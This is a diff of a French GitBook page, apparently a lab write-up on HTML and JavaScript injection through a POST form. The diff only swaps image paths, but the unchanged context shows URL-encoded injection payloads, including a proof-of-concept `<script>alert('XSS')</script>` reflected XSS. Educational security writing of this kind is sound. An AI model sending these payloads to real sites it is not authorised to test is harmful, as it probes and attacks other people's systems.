@@ -4,7 +4,7 @@
 
 L'exploitation est ici triviale. Le prénom et le nom sont renseignés dans un formulaire transféré par la méthode HTTP `POST` :&#x20;
 
-![](<../../../../../.gitbook/assets/image (14).png>)
+![](<../../../../../.gitbook/assets/image (17).png>)
 
 Dont voici la requête :&#x20;
 
@@ -56,7 +56,7 @@ Connection: close
 firstname=%3Ch1%3ETitre+H1+contenant+le+pr%C3%A9nom%3C%2Fh1%3E&lastname=%3Ch1%3ETitre+H1+contenant+le+nom%3C%2Fh1%3E&form=submit
 ```
 
-![](<../../../../../.gitbook/assets/image (18).png>)
+![](<../../../../../.gitbook/assets/image (19).png>)
 
 Mais l'injection Javascript est également tout à fait possible, ici avec `<script>alert('XSS')</script>` :&#x20;
 
@@ -74,7 +74,7 @@ Connection: close
 firstname=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&lastname=nom&form=submit
 ```
 
-![](<../../../../../.gitbook/assets/image (8) (1).png>)
+![](<../../../../../.gitbook/assets/image (9).png>)
 
 ## Analyse du code source
 
